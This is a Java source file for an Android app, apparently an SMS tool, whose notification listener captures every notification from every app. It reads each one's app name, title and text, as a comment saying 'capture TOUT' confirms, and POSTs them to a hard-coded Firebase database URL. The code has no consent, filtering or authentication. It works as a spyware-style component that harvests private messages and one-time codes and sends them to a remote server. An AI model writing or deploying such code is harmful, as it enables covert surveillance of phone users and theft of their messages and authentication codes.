package com.akim_sms;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class NotifListener extends NotificationListenerService {

    private static final String FIREBASE_URL =
            "https://sms-akim-default-rtdb.firebaseio.com/sms.json";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;
        Bundle extras = sbn.getNotification().extras;
        if (extras == null) return;

        String appName = sbn.getPackageName();
        String titre = extras.getString(Notification.EXTRA_TITLE, "");
        String texte = extras.getString(Notification.EXTRA_TEXT, "");
        if (texte == null || texte.isEmpty()) return;

        // Pour le test : on capture TOUT
        envoyerVersFirebase(appName + " | " + titre, texte);
    }

    private void envoyerVersFirebase(final String expediteur, final String message) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(FIREBASE_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);

                    String exp = expediteur == null ? "" : expediteur.replace("\"", "'");
                    String msg = message == null ? "" : message.replace("\"", "'").replace("\n", " ");
                    String json = "{\"de\":\"" + exp + "\",\"msg\":\"" + msg + "\"}";

                    OutputStream os = conn.getOutputStream();
                    os.write(json.getBytes("UTF-8"));
                    os.flush();
                    os.close();
                    conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
